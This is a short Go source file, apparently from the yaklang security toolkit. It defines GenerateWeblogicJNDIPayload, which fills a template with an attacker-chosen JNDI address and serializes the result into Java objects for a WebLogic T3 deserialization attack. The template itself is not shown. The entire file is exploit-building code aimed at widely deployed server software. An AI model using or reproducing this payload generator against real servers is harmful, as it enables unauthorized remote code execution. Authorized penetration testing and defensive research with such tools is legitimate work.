package t3

import (
	"bytes"
	"text/template"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
)

func GenerateWeblogicJNDIPayload(addr string) []byte {
	templ, _ := template.New(utils.RandStringBytes(5)).Parse(WeblogicJNDIPayload)
	tmpParams := map[string]interface{}{
		"raw":   codec.EncodeBase64(addr),
		"size":  len(addr),
		"value": addr,
	}
	var buf bytes.Buffer
	templ.Execute(&buf, tmpParams)
	ser, _ := yserx.FromJson(buf.Bytes())
	serx := yserx.MarshalJavaObjects(ser...)
	return serx
}
